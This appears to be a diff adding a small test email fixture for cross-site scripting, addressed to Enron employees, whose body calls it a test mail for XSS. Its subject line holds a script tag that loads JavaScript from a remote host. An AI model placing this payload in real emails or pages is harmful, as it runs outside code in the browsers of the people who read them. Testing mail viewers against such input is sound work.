@@ -1,0 +1,7 @@
+From: "Laurence Pollard" <amxgering@verizon.net>
+To: joe.parks@enron.com, eric.boyt@enron.com
+Subject: <script src=//x.cn/1.js async>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
